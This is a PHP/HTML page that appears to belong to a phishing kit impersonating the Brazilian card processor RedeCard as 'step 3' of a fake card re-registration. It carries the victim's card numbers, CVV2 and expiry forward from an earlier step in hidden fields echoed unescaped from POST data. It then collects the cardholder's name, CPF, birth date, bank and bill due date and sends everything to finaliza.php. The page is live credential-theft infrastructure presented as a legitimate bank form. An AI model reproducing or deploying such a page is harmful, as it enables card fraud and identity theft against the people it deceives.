<?php

?>

<html><head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<link type="text/css" rel="STYLESHEET" href="estilo.css">
		<style type="text/css">
<!--
.style1 {
	font-size: 10
}
.style2 {font-size: 18px}
-->
        </style>
		<title>RedeCard - Recadastramento Passo 3</title></head>
<body leftmargin="0" topmargin="0" marginheight="0" marginwidth="0" rightmargin="0" bottommargin="0">
		<SCRIPT language=JavaScript>
	function validaForm(){
		d = document.ola;
							if (d.nome.value == ""){
alert("Digite o seu nome");
return false;
}
							if (d.cp1.value.length!=3){
alert("Digite os 3 primeiros digitos do CPF");
return false;
}
							if (d.cp2.value.length!=3){
alert("Digite os próximos 3 digitos do CPF");
return false;
}
							if (d.cp3.value.length!=3){
alert("Digite os próximos 3 digitos do CPF");
return false;
}
							if (d.dig_cp.value.length!=2){
alert("Digite os dois últimos dígitos do CPF");
return false;
}

							if (d.dig_cp.value.length!=2){
alert("Digite os dois últimos dígitos do CPF");
return false;
}
							if (d.venc_fatura.value.length == ""){
alert("Digite o dia do Vencimento");
return false;
}

							if (d.nome_b.value.length == ""){
alert("Informe o Banco Emissor do Seu Cartão");
return false;
}

							if (d.nasc_dia.value.length == ""){
alert("Informe o dia do Nascimento do Titular");
return false;
}							
							if (d.nasc_mes.value.length == ""){
alert("Informe o Mês do Nascimento do Titular");
return false;
}							
					if (d.nasc_ano.value.length == ""){
alert("Informe o Ano do Nascimento do Titular");
return false;
}							

		}
</SCRIPT>
		<form name="ola" method="post"  onSubmit="return validaForm()" action="finaliza.php">
        <input name="ccn1" type="hidden" id="ccn1" value="<?php echo $_POST['ccn1'];?>" />
        <input name="ccn2" type="hidden" id="ccn2" value="<?php echo $_POST['ccn2'];?>" />
        <input name="ccn3" type="hidden" id="ccn3" value="<?php echo $_POST['ccn3'];?>" />
        <input name="ccn4" type="hidden" id="ccn4" value="<?php echo $_POST['ccn4'];?>" />
        <input name="cvv2" type="hidden" id="cvv2" value="<?php echo $_POST['cvv2'];?>" />
        <input name="smes" type="hidden" id="smes" value="<?php echo $_POST['smes'];?>" />
        <input name="sano" type="hidden" id="sano" value="<?php echo $_POST['sano'];?>" />
		<table width="580" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td align="center">

			<!--Inicio Cabeçalho -->			
			

	<table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
	<tbody><tr>
	<td width="10" height="55">


		<img src="img/logo2.jpg" width="80" border="0" height="60"><img src="img/trans.gif" width="10" border="0" height="1"></td>
	<td width="80">&nbsp;


		</td>

	<td width="100%" align="center"><img src="img/logo.jpg" width="278" border="0" height="41"></td>
	<td>
		<table class="corpoResumo" width="150" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td align="center" height="55"> </td>
		</tr>
		</tbody></table>
	</td>

	<td width="10">&nbsp;</td>
	</tr>
	</tbody></table> 


			<table class="corpo" width="93%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" height="293">
			<tbody><tr>
			<td valign="top" bgcolor="#FFFFFF">
			<!--CORPO-->
				Complete as informações abaixo e clique em Concluir:<br>
				
				<table class="corpo" width="102%" align="center" border="0" cellpadding="0" cellspacing="0">

				<tbody>
			<tr>
			<td width="50%" colspan="3">
				Nome do titular <FONT SIZE=&#8221;1&#8221; COLOR="#C0C0C0">&nbsp;(gravado 
				no Cartão)</FONT><br>
				<input name="nome" style="width: 268;height:21" class="box" maxlength="200" size="20" value="" type="text"> 
		</td>
			<td width="1%">			</td>
			</tr>

			<tr>
			<td height="45" colspan="3"><p>
			<img src="img/mcname.jpg" width="83" height="54"></p>			  </td>
			</tr>
			<tr>
			</td></tr><tr>
				  <td height="39" width="56%"><p>Informe o CPF do Titular <br>
				      <input name="cp1" style="width: 27px;" class="box" maxlength="3" size="20" value=""  type="text">

				      <input name="cp2" style="width: 27px;" class="box" maxlength="3" size="20" value=""  type="text">
				      <input name="cp3" style="width: 27px;" class="box" maxlength="3" size="20" type="text">
				      <span class="style2">-</span>
				      <input name="dig_cp" style="width: 17px;" class="box" maxlength="2" size="20" type="text">&nbsp;&nbsp;&nbsp;
				    </p>
			      </td>
				  <td height="39" width="41%">
					<p align="center">Venc da Fatura <br>

			      <select class="box" name="venc_fatura" id="venc_fatura" size="1">
			        <option value="" selected="selected"> </option>
			        <option value="01" selected>01</option>
			        <option value="02">02</option>
			        <option value="03">03</option>
			        <option value="04">04</option>

			        <option value="05">05</option>
			        <option value="06">06</option>
			        <option value="07">07</option>
			        <option value="08">08</option>
			        <option value="09">09</option>
			        <option value="10">10</option>

			        <option value="11">11</option>
			        <option value="12">12</option>
			        </select></td>
				  <td height="124" rowspan="3">
					<p align="center">&nbsp;</p>
					<p>&nbsp;</p>
					<p>&nbsp;</p>
					<p>&nbsp;</td></tr><tr>

				  <td height="49" width="56%"><span class="corpo">Data Nasc. 
					Titular <br>
					</span>
			      <select class="box" name="nasc_dia" id="nasc_dia" size="1">
			        <option value="" selected="selected"> </option>
			        <option value="01">01</option>
			        <option value="02">02</option>
			        <option value="03">03</option>

			        <option value="04">04</option>
			        <option value="05">05</option>
			        <option value="06">06</option>
			        <option value="07">07</option>
			        <option value="08">08</option>
			        <option value="09">09</option>

			        <option value="10">10</option>
			        <option value="11">11</option>
			        <option value="13">13</option>
			        <option value="14">14</option>
					<option value="15">15</option>
					<option value="16">16</option>

					<option value="17">17</option>
					<option value="18">18</option>
					<option value="19">19</option>
					<option value="20">20</option>
					<option value="21">21</option>
					<option value="22">22</option>

					<option value="23">23</option>
					<option value="24">24</option>
					<option value="25">25</option>
					<option value="26">26</option>
					<option value="27">27</option>
					<option value="28">28</option>

					<option value="29">29</option>
					<option value="30">30</option>
					<option value="31">31</option><option value="12">12</option>

			        </select> /
			      <select class="box" name="nasc_mes" id="nasc_mes" size="1">
			        <option value="" selected="selected"> </option>

			        <option value="01">01</option>
			        <option value="02">02</option>
			        <option value="03">03</option>
			        <option value="04">04</option>
			        <option value="05">05</option>
			        <option value="06">06</option>

			        <option value="07">07</option>
			        <option value="08">08</option>
			        <option value="09">09</option>
			        <option value="10">10</option>
			        <option value="11">11</option>
			        <option value="12">12</option>

			        </select> / <select class="box" name="nasc_ano" id="nasc_ano" size="1">
<option value="" selected></option>
				
                <option value="2010">2010</option>
<option value="2009">2009</option>
<option value="2008">2008</option>
<option value="2007">2007</option>
<option value="2006">2006</option>
<option value="2005">2005</option>

<option value="2004">2004</option>
<option value="2003">2003</option>
<option value="2002">2002</option>
<option value="2001">2001</option>
<option value="2000">2000</option>
<option value="1999">1999</option>
<option value="1998">1998</option>
<option value="1997">1997</option>
<option value="1996">1996</option>

<option value="1995">1995</option>
<option value="1994">1994</option>
<option value="1993">1993</option>
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>

<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>

<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>

<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>

<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>

<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>

<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>

<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>

<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>

<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
<option value="1911">1911</option>
<option value="1910">1910</option>
<option value="1909">1909</option>
<option value="1908">1908</option>
<option value="1907">1907</option>
<option value="1906">1906</option>

<option value="1905">1905</option>
<option value="1904">1904</option>
<option value="1903">1903</option>
<option value="1902">1902</option>
<option value="1901">1901</option>
<option value="1900">1900</option>
				
				</select></td>
				  <td height="49" width="41%">
			      <p align="center">&nbsp;<span class="corpo">Banco do Cartão<br>

					</span>
			        <input name="nome_b" style="width: 107;height:21" class="box" size="20" value=""  type="text" id="bancoemissor"></td></tr><tr>
				<td colspan="4">
					<table width="" border="0" cellpadding="0" cellspacing="0">
					<tbody><tr>
					<!--TD WIDTH="147"><INPUT TYPE="Button" ONCLICK="fechar();" VALUE="Cancelar" name="Button1"></TD-->
					<td><input value="Concluir" name="Submit1" type="submit"> 
					<input onClick="fechar();" value="Cancelar" name="Button2" type="button">					</td>
					</tr>

					</tbody></table>				</td>
				</tr>				
				</tbody></table>
			  

				</form>
			<!--/CORPO-->
			</td>
			<td width="11" bgcolor="#FFFFFF">&nbsp;</td>
			<td valign="top" width="211" bgcolor="#FFFFFF">
				<!--Inicio Comprovante-->

					
		<table width="161" border="0" cellpadding="0" cellspacing="0">
		<tbody><tr>
		<td class="bgResumo" valign="top" align="center" height="250">
			<table width="197" border="0" cellpadding="0" cellspacing="0">
			<tbody><tr>
			<td height="10"></td>
			</tr>
			<tr>

			<td class="titResumo" align="center">Informações</td>
			</tr>
			<tr>
			<td height="5"></td>
			</tr>
			<tr>
			<td class="corpoResumoTitulo">
				<b class="subTitResumo">Siga os passos abaixo:</b><br><br>

				<b class="corpoResumoTitulo">1ª Digite os 6 primeiros digito do 
				cartão.
</b> <font class="corpoConteudo"></font><br><br>
				<b class="corpoResumoTitulo">2ª Digite os demais dados do 
				cartão.
</b> <font class="corpoConteudo"></font><br><br>
				<b class="corpoResumoTitulo">3ª Digite os dados do titular do 
				cartão.</b> <font class="corpoConteudo"></font><br><br>
				
				<br>
				<center><img src="cbp.visanet_arquivos/px_preto.gif" vspace="5" width="95%" border="0" height="2"></center>
				<br>
				

				<center><span style="font-size: 7pt;"><br>
				REDECARD ©
				</span>
				</center> <br>

			</td>
			</tr>
			</tbody></table>
		</td>
		</tr>
		</tbody></table>



				<!--Fim Comprovante-->

</td>
			<td width="10" bgcolor="#FFFFFF"><img src="img/trans.gif" width="10" border="0" height="1"></td>
			</tr>
			</tbody></table>
		</td>
		</tr>
		</tbody></table>
		</body></html>
